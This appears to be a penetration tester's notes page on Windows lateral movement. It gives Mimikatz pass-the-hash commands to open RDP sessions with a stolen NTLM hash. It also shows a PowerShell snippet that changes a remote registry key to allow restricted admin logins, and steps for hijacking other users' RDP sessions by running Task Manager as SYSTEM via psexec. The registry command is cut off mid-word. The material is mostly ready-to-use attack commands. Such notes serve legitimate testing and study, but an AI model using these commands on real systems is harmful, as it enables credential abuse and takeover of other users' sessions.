---
title: "Miscellaneous"
date: 2020-07-17T20:59:33+02:00
draft: false
---

#### Using PowerView to enumerate Shares, Admin access and more (ToDo)
https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview

#### Pass The Hash to mstsc.exe using Mimikatz

```sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"```

This will open a new RDP window. If it still shows the user you are currently logged on with, just ignore it - everything will just work.

A registry key controls if a server accepts Restricted Admin sessions. If you have the NTLM hash of a user that has privileges to set registry keys, you can use for example Powershell to enable it and log in via RDP afterwards:

```mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"```

A new Powershell window will pop up:

```powershell
Enter-PSSession -Computer <Target>
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWO
```

#### Connect to other users on the system that have a active RDP session
When you're on a system (as local admin) where other users are connected through RDP it is possible to hijack their session.
Launch taskmgr.exe under SYSTEM, e.g. using psexe:

```psexec.exe -sid taskmgr.exe```

Verify taskmgr is running under system, then navigate to the 'users' tab, right click on the user you want to take over and click 'connect'.

#### References
https://edermi.github.io/post/2018/native_rdp_pass_the_hash/